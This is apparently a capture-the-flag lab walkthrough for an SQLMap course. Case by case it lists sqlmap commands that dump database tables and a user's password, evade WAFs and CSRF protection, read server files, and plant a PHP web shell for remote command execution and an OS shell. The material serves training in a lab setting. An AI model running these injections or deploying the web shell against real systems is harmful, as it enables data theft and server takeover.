# SQLMap Essentials
---

## Question: What's the contents of table flag2? (Case #2)

```bash
sqlmap -r HTBcase2.txt --batch --dump
```

Uses a saved HTTP request file to automatically detect SQLi and dump all database contents

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

Tests the GET parameter `id` for SQL injection automatically

---

## Question: What's the contents of table flag3? (Case #3)

```bash
sqlmap -u "http://83.136.249.34:58962/case3.php" --cookie='id=1*' --batch --dump
```

Injects SQL payload into a vulnerable COOKIE parameter (`id`)

Dumps all database contents automatically

---

## Question: What's the contents of table flag4? (Case #4)

```bash
sqlmap  -u "http://83.136.249.34:58962/case4.php" --data="id=1*" --batch --dump
```

Tests SQL injection in POST parameter `id` and dumps all data

```bash
sqlmap -r HTBcase4.txt --batch --dump 
```

Uses a captured POST request file to detect and exploit SQLi

---

## Question: What's the contents of table flag5? (Case #5)

```bash
sqlmap -u http://83.136.249.34:41809/case5.php?id=1 -T flag5 -D testdb --level 5 --risk 3 --batch --dump --no-cast
```

Aggressive SQLi testing on GET parameter `id`

Dumps `flag5` table from `testdb`

`--no-cast` avoids data type conversion issues

```bash
sqlmap -r case5.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL -D testdb -T flag5 --dump
```

Uses request file and explicitly targets MySQL database

---

## Question: What's the contents of table flag6? (Case #6)

```bash
sqlmap -r case6.req --batch -p 'col' --level=5 --risk=3 --prefix='`)' -D testdb -T flag6 --dump --flush-session
```

Injects into parameter `col` with a custom SQL prefix to bypass filtering

Flushes previous SQLMap session data

```bash
sqlmap -u http://83.136.249.34:41809/case6.php?col=id -T flag6 --dump --no-cast --prefix='`)' --level 5 --risk 3 --no-cast
```

Performs SQL injection using crafted prefix and dumps flag table

---

## Question: What's the contents of table flag7? (Case #7)

```bash
sqlmap -u http://83.136.249.34:41809/case7.php?id=1 --no-cast --batch -dbms MySQL --union-cols=5 -D testdb -T flag7 --dump --no-cast --flush-session
```

Forces UNION-based SQLi with 5 columns

Dumps flag7 table using MySQL-specific exploitation

---

##  Question: What's the contents of table flag1 in the testdb database? (Case #1) Detect and exploit SQLi vulnerability in GET parameter id

```bash
sqlmap -u http://83.136.249.34:41809/case1.php?id=1 --dump --batch --no-cast --level 5 --risk 3 -T flag1 -D testdb
```

Detects and exploits SQLi in GET parameter `id`

Dumps `flag1` table from `testdb`

---

##  Question: What's the name of the column containing "style" in it's name? (Case #1)

```bash
sqlmap -r case1.req --batch -p 'id' --search -C "style"
```

Searches for column names containing the keyword "style"

```bash
sqlmap -u http://83.136.249.34:41809/case1.php?id=1 --batch --no-cast --search -C style 
```

Same column search performed directly via URL

---

##  Question: What's the Kimberly user's password? (Case #1)

```bash
sqlmap -u http://83.136.249.34:41809/case1.php?id=1  --batch -p 'id' -dbms MySQL -D testdb -T users --columns -C name,password --dump --no-cast
```

Dumps `name` and `password` columns from `users` table

Used to extract Kimberly's password

---

##  Question: What's the contents of table flag8? (Case #8)

```bash
sqlmap -r HTBcase8.txt --dump --batch --no-cast --csrf-token="t0ken" -T flag8 -D testdb
```

Handles CSRF-protected SQL injection using token

Dumps flag8 table

---

##  Question: What's the contents of table flag9? (Case #9)

```bash
sqlmap -u "http://83.136.250.108:43651/case9.php?id=1&uid=1984306861" --randomize=uid --batch --dump --no-cast -T flag9 -D testdb
```

Randomizes `uid` parameter to bypass caching or WAF

Dumps flag9 table

---

##  Question: What's the contents of table flag10? (Case #10)

```bash
sqlmap -u "http://83.136.250.108:43651/case10.php" --data="id=1" --batch --dump --no-cast -T flag10 -D testdb --random-agent
```

POST-based SQL injection

Randomizes User-Agent to evade detection

---

##  Question: What's the contents of table flag11? (Case #11)

```bash
sqlmap -u  http://83.136.250.108:43651/case11.php?id=1 " --batch --dump --no-cast -T flag11 -D testdb --tamper=between
```

Uses `between` tamper script to evade WAF filtering

---

##  Question: Try to use SQLMap to read the file "/var/www/html/flag.txt"

```bash
sqlmap -u "http://94.237.123.185:34855/?id=1" --file-read "/var/www/html/flag.txt" --batch 
```

Reads a file from the remote server using SQLi file read capability

---

##  Question: Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Creates a PHP web shell locally

```bash
sqlmap -u "http://94.237.123.185:34855/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"--batch
```

Uploads the web shell to the remote server

```bash
curl http://94.237.123.185:34855/shell.php?cmd=ls+-la
```

Executes commands remotely via uploaded shell

```bash
sqlmap -u "http://94.237.123.185:34855/?id=1" --os-shell --batch
```

Opens an interactive OS shell via SQLMap

```bash
#if error
sqlmap -u "http://94.237.123.185:34855/?id=1" --os-shell --technique=E --batch
```

Forces error-based SQLi for OS shell

```bash
cat /flag.txt
```

Reads the final flag file from the system

---

##  Question: What's the contents of table final_flag?

```bash
sqlmap -u http://94.237.58.137:46307/action.php --batch --data="id=1" --random-agent --tamper=between -dbms MySQL --flush-session
```

Detects SQLi in JSON POST parameter `id`

Flushes previous scan data

```bash
sqlmap -u http://94.237.58.137:46307/action.php --batch --data="id=1" --random-agent --tamper=between -dbms MySQL --is-dba
```

Checks if current database user has DBA privileges

```bash
sqlmap -u http://94.237.58.137:46307/action.php --batch --data="id=1" --random-agent --tamper=between -dbms MySQL --schema
```

Enumerates all database schemas

```bash
$ sqlmap -u http://94.237.58.137:46307/action.php --batch --data="id=1" --random-agent --tamper=between -dbms MySQL -D production -T final_flag --dump --level 5 --risk 3
```

Dumps the `final_flag` table from `production` database

